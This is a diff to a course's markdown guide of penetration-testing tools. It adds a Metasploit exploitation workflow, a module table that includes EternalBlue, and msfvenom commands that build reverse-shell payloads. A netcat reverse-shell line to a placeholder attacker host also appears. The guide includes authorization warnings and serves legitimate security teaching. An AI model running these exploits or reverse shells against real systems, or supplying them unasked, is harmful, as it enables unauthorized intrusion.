@@ -224,17 +224,62 @@ searchsploit sar2html
 
 ## Exploitation
 
+> [!WARNING]
+> Every tool in this section can cause real damage to real systems. Use them **only** against targets you have written authorization to test. See [Legal & Ethics](legal-and-ethics.md) for the full framework.
+
 ### Metasploit Framework
 
-Modular exploitation framework. Not primary for course CTFs (which emphasized manual methods) but standard in the industry.
+The industry-standard exploitation framework. Metasploit provides a modular architecture for exploit development, payload generation, post-exploitation, and reporting. Not the primary tool for the course CTFs (which emphasized manual methods), but essential knowledge for any penetration tester.
+
+**Core workflow:**
 
 ```bash
+# Launch the console
 msfconsole
-use exploit/unix/webapp/joomla_comfields_sqli_rce
-set RHOSTS <target>
-set LHOST <attacker>
-exploit
+
+# Search for exploits
+msf6 > search joomla type:exploit
+msf6 > search sar2html
+
+# Select and configure an exploit
+msf6 > use exploit/unix/webapp/joomla_comfields_sqli_rce
+msf6 exploit(joomla_comfields_sqli_rce) > show options
+msf6 exploit(joomla_comfields_sqli_rce) > set RHOSTS <target>
+msf6 exploit(joomla_comfields_sqli_rce) > set LHOST <attacker>
+
+# Run the exploit
+msf6 exploit(joomla_comfields_sqli_rce) > exploit
+
+# Manage sessions (if exploit succeeds)
+msf6 > sessions -l            # List active sessions
+msf6 > sessions -i 1          # Interact with session 1
 ```
+
+**Key modules used or referenced in this course:**
+
+| Module | Purpose | Context |
+|---|---|---|
+| `exploit/windows/smb/ms17_010_eternalblue` | EternalBlue SMB RCE | Week 6 — Network Services |
+| `exploit/unix/webapp/joomla_comfields_sqli_rce` | Joomla SQL injection → RCE | Week 13 — Boiler CTF (alternative path) |
+| `auxiliary/scanner/smb/smb_enumshares` | SMB share enumeration | Week 6 — Network Services |
+| `auxiliary/scanner/ssh/ssh_version` | SSH version fingerprinting | General reconnaissance |
+| `post/multi/recon/local_exploit_suggester` | Suggest local privesc exploits | Post-exploitation |
+
+**Payload generation with msfvenom:**
+
+```bash
+# PHP reverse shell (used in WordPress theme editor attacks like Mr. Robot)
+msfvenom -p php/reverse_php LHOST=<attacker> LPORT=4444 -f raw > shell.php
+
+# Linux reverse shell (ELF binary)
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=<attacker> LPORT=4444 -f elf > shell.elf
+
+# Windows reverse shell
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker> LPORT=4444 -f exe > shell.exe
+```
+
+> [!TIP]
+> In real engagements, prefer manual exploitation when possible — it demonstrates deeper understanding and avoids Metasploit's network signatures that modern EDR detects. Use Metasploit for efficiency when manual methods are impractical or when its post-exploitation modules (pivoting, session management) add genuine value.
 
 ### Hydra
 
@@ -275,6 +320,9 @@ nc <attacker> 4444 -e /bin/bash
 ---
 
 ## Post-Exploitation & Privilege Escalation
+
+> [!NOTE]
+> Post-exploitation is where discipline matters most. Document every command, every file accessed, and every credential discovered. In a real engagement, this is where the report is built — and where scope violations happen if you are not careful.
 
 ### GTFOBins
 
